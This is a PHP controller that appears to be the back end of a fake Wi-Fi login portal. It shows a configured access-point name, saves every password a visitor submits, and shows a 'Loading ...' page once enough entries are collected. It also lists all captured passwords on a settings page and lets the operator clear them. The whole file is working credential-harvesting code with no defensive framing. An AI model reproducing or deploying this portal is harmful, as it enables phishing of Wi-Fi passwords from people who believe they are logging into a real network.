<?php

namespace App\Controllers;

use System\Core\Controller;
use App\Models\Wifi;
use App\Models\Settings;

class IndexCtrl extends Controller
{

    public function index()
    {
        if (Wifi::count() >= intval(Settings::where('name', 'pw_input_times')->first()->val))
        {
            return $this->json('Loading ...');
        }
        else
        {
            $this->view->set('web/index', [
                'ap_name' => Settings::where('name', 'ap_name')->first()->val
            ]);
        }
    }

    public function settings()
    {
        return $this->view->set('web/settings', [
                    'opts' => Settings::all()->mapWithKeys(function($opt) {
                                return [$opt['name'] => $opt['val']];
                            }),
                    'pws' => Wifi::all(['pass'])->map(function ($item) {
                                return $item->pass;
                            })
        ]);
    }

    public function update_settings()
    {
        Settings::updateSettings($this->request->getParsedBody());
        return $this->redirect($this->request->getUri()->getPath());
    }

    public function save_pw()
    {
        Wifi::write($this->request->getParsedBody()['pass']);
        return $this->redirect('/');
    }

    public function clear_all_pws()
    {
        Wifi::clear();
        return $this->redirect('/');
    }

}
